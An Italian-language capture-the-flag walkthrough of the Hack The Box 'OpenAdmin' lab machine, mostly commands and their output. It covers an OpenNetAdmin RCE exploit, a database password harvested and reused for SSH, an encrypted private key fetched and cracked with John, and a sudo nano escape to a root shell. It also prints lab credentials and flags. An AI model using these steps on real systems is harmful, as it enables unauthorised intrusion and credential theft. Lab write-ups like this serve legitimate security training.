@@ -1,0 +1,225 @@
+1) come sempre masscan e nmap:
+	masscan -p1-65535 10.10.10.171 --rate 1000 --open --banners -e tun0
+	nmap -p22,80 -Pn -sC -sV -oA nmap/openadmin 10.10.10.171
+	
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+non c'è nulla di particolarmente interessante
+
+2)andando alla pagina web del web server sulla porta 80, c'è solo la home page di apache
+provo a fare scansione con dirb:
+
+---- Scanning URL: http://10.10.10.171/ ----
+==> DIRECTORY: http://10.10.10.171/artwork/                                                                                                          
++ http://10.10.10.171/index.html (CODE:200|SIZE:10918)                                                                                               
+==> DIRECTORY: http://10.10.10.171/music/                                                                                                            
++ http://10.10.10.171/server-status (CODE:403|SIZE:277) 
+
+
+nella pagina /music/ se si preme login si viene rimandati ad un pannello
+admin senza bisogno di inserire password ecc
+Il pannello è OpenNetAdmin ed è nella pagina http://10.10.10.171/ona/
+Sul lato sinistro della pagina c'è un banner che dice che la versione in uso non è la più recente (versione in uso = 18.1.1)
+
+3) per ottenre una shell basta usare l'exploit: https://www.exploit-db.com/exploits/47691
+dopo averlo scaricato basta avviarlo con:
+	
+	./47691.sh http://10.10.10.171/ona/ 
+	
+e si ottiene una shell (in effetti non è una shell ma una RCE quindi ad ogni comando viene eseguito di nuovo lo script
+per questo ci si trova sempre nella stessa cartella -> per eseguire comandi da altre parti si deve per forza usare la concatenzaione con ;).
+
+nella cartella home troviamo i seguenti user:
+
+drwxr-xr-x  4 root   4096 Nov 22 18:00 .
+drwxr-xr-x 24 root   4096 Nov 21 13:41 ..
+drwxr-x---  5 jimmy  4096 Nov 22 23:15 jimmy
+drwxr-x---  6 joanna 4096 Nov 28 09:37 joanna
+
+
+
+sono nella cartella /opt/ona/www che contiene:
+
+drwxrwxr-x 10 www-data 4096 Jan  6 11:48 .
+drwxr-x---  7 www-data 4096 Nov 21 18:23 ..
+-rw-rw-r--  1 www-data 1970 Jan  3  2018 .htaccess.example
+drwxrwxr-x  2 www-data 4096 Jan  3  2018 config
+-rw-rw-r--  1 www-data 1949 Jan  3  2018 config_dnld.php
+-rw-rw-r--  1 www-data 4160 Jan  3  2018 dcm.php
+drwxrwxr-x  3 www-data 4096 Jan  3  2018 images
+drwxrwxr-x  9 www-data 4096 Jan  3  2018 include
+-rw-rw-r--  1 www-data 1999 Jan  3  2018 index.php
+drwxrwxr-x  5 www-data 4096 Jan  3  2018 local
+-rw-rw-r--  1 www-data 4526 Jan  3  2018 login.php
+-rw-rw-r--  1 www-data 1106 Jan  3  2018 logout.php
+drwxrwxr-x  3 www-data 4096 Jan  3  2018 modules
+drwxrwxr-x  3 www-data 4096 Jan  3  2018 plugins
+drwxrwxr-x  2 www-data 4096 Jan  3  2018 winc
+drwxrwxr-x  3 www-data 4096 Jan  3  2018 workspace_plugins
+
+con cat local/config/database_settings.inc.php
+si riesce ad ottenere -> 
+
+<?php
+
+$ona_contexts=array (
+  'DEFAULT' => 
+  array (
+    'databases' => 
+    array (
+      0 => 
+      array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+    ),
+    'description' => 'Default data context',
+    'context_color' => '#D3DBFF',
+  ),
+);
+
+probabilmente la password indicata è anche la password di uno degli utenti e infatti si riesce ad eccedere a jimmy con:
+	jimmy:n1nj4W4rri0R!
+	
+
+
+
+4) ora ho l'accesso come jimmy tramite ssh:
+
+uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal) //gruppo internal (?)
+
+
+nella cartella home di jimmy non c'è il file user.txt
+quindi sarà nella cartella joanna, devo trovare il modo di accedere come joanna
+
+usando -> find / -user jimmy
+trovo tutti i file a cui l'utente jimmy può accedere, tra questi ci sono alcuni files in /var/
+in particolare la cartella /var/www/internal:
+
+-rwxrwxr-x 1 internal  3229 Nov 22 23:24 index.php
+-rwxrwxr-x 1 internal   185 Nov 23 16:37 logout.php
+-rwxrwxr-x 1 internal   339 Nov 23 17:40 main.php
+
+questi files contengono un sito a cui l'utente jimmy può accedere e aprire shell con lìutente joanna
+usando la stessa password trovata prima
+dal browser non è accessibile -> potrebbe essere accessibile solo da localhost
+anche curl da 404 ma potrebbe essere perchè la porta è sbagliata, usando netstat -vaun ottengo:
+
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+udp        0      0 127.0.0.53:53           0.0.0.0:*                        
+
+quindi l'altro server è a 127.0.0.53:53 e infatti è possibile pingare 127.0.0.53
+
+index.php -> accedi tramite curl -> se dati corretti (username e password di johnny) reindirizza a main.php -> stampa id_rsa joanna
+poi crack con johnny
+
+in realtà il server corretto non è 127.0.0.53:53 ma localhost:52846 (127.0.0.53 potrebbe comunque essere utile in seguito) , infatti basta fare le due seguenti curl (una dopo l'altra):
+
+	curl http://127.0.0.1:52846/index.php?username=jimmy&password=n1nj4W4rri0R!	//chiama index
+	curl http://127.0.0.1:52846/main.php?username=jimmy&password=n1nj4W4rri0R!	//chiama main
+
+per ottenere una chiave rsa:
+
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+
+
+5) leggendo il codice sono certo che questa è la chiave RSA dell'user joanna. per trovare la password posso usare johnny:
+	
+	/usr/share/john/ssh2john.py rsa_joanna_found > rsa_john
+	john --wordlist=/root/Desktop/lists/rockyou.txt  rsa_john
+
+si ottiene la passphrase -> bloodninjas
+
+che posso usare per accedere usando l'id_rsa trovato:
+
+ssh -i ./rsa_joanna_found joanna@10.10.10.171
+
+(prima di poter fasre questa cosa è necessario mettere i permessi del file che contiene la chiave a 0600 altrimenti non la fa usare e chiede la pass dell'account)
+
+
+si ottiene user flag:
+
+	
+	c9b2cf07d40807e62af62660f0c81b5f
+
+
+
+6) ora si deve fare privesc a utente root.
+usando sudo -l ottengo:
+	
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+    
+nano può essere usato per spawnare una shell interattiva e visto che posso eseguirlo come root senza dover inserire la password
+dovrei riuscire a sfruttarlo per la privesc
+
+	sudo /bin/nano  /opt/priv
+
+all'interno di nano:
+
+premere -> ^R^X (ctrl+R e ctrl+X)
+e poi scrivere -> reset; sh 1>&0 2>&0 
+
+in questo modo si ottiene una shell con utente root
+
+flag di root:
+
+
+	2f907ed450b361b2c2bf4e8795d5b561
+
+
+
+
+
+
+
+
+
+
+
+
